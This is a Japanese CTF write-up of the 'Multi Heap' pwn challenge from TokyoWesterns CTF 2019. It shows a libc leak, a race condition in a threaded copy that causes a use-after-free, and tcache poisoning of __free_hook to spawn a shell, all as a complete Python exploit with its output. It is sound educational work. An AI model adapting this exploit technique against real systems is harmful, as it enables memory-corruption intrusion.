# [pwn 279pts] Multi Heap - TokyoWesterns CTF 5th 2019
64ビットバイナリで、全部有効です。
```
$ checksec -f multi_heap
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      Yes     0               4       multi_heap
```
C++製のヒープとか嫌な思い出しかないですが、とりあえずIDAで読みます。
allocではchar,long,floatから選べて、サイズを聞かれてnewされます。
さらにmainかthreadかを選べて、mainの場合はmalloc、threadの場合はスレッドが作られてその中でmallocされます。

なんか適当にやったらとりあえずlibcリークは簡単にできました。
```python
alloc('char', 0x500)
free(0)
alloc('char', 0x80)
libc_base = u64(write(0)[0]) - libc_main_arena - delta
logger.info("libc base = " + hex(libc_base))
```

で、copyのコードを読むと、これもmemcpyするかスレッド立てるかできるのですが、スレッドの方はなんか`usleep(1)`して要素を1つずつコピーしています。
usleepだから動くか怪しいですが、これ普通にrace conditionにならないですかね。

試しに次のようなコードを動かしてみました。
```
alloc('char', 0x400) # 1
alloc('char', 0x400) # 2
read(1, 0x80, p64(libc_base + libc.symbol("__free_hook")) + b'A' * 0x78)
copy(1, 2, 0x400, 'y\n2\n2')
```
そんでfreeされたチャンクを見ると
```
pwndbg> x/8xg 0x560d5b0fe400
0x560d5b0fe400: 0x00007f2155e908e8      0x4141414141414141
0x560d5b0fe410: 0x4141414141414141      0x4141414141414141
0x560d5b0fe420: 0x4141414141414141      0x4141414141414141
0x560d5b0fe430: 0x4141414141414141      0x4141414141414141
```
UAFできてます。勝ち。

```python
from ptrlib import *

def alloc(type, size, main = True):
    sock.sendlineafter("choice: ", "1")
    sock.sendlineafter("Which: ", type)
    sock.sendlineafter("Size: ", str(size))
    sock.recvuntil("): ")
    if main:
        sock.sendline("m")
    else:
        sock.sendline("t")
    return

def free(index):
    sock.sendlineafter("choice: ", "2")
    sock.sendlineafter("Index: ", str(index))
    return

def write(index):
    sock.sendlineafter("choice: ", "3")
    sock.sendlineafter("Index: ", str(index))
    result = []
    while True:
        r = sock.recvline()
        if b'=====' in r: break
        result.append(r)
    return result

def read(index, size, data):
    sock.sendlineafter("choice: ", "4")
    sock.sendlineafter("Index: ", str(index))
    sock.sendlineafter("Size: ", str(size))
    sock.sendline(data)
    return

def copy(src, dst, size, thread):
    sock.sendlineafter("choice: ", "5")
    sock.sendlineafter("index: ", str(src))
    sock.sendlineafter("index: ", str(dst))
    sock.sendlineafter("Size: ", str(size))
    sock.sendlineafter("): ", thread)
    return

libc = ELF("./libc.so.6")
sock = Process("./multi_heap")
libc_main_arena = 0x3ebc40
delta = 1168

# libc leak
alloc('char', 0x500)
free(0)
alloc('char', 0x80)
libc_base = u64(write(0)[0]) - libc_main_arena - delta
logger.info("libc base = " + hex(libc_base))

# UAF by race condition
alloc('char', 0x400) # 1
alloc('char', 0x400) # 2
read(1, 0x80, p64(libc_base + libc.symbol("__free_hook")) + b'A' * 0x78)
copy(1, 2, 0x400, 'y\n2\n2')

# tcache poisoning
alloc('char', 0x400) # 2
alloc('char', 0x400) # 3
read(2, 0x8, '/bin/sh\x00')
read(3, 0x8, p64(libc_base + libc.symbol("system")))

# get the shell!
free(2)

sock.interactive()
```

まじでこれで終わった。
```
$ python solve.py 
[+] __init__: Successfully created new process (PID=10438)
[+] <module>: libc base = 0x7ff6be50f000
[ptrlib]$ id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
[ptrlib]$
```

# 感想
これたぶん非想定解だと思いますが、面倒なのはいやなのでこれで終わりということで......
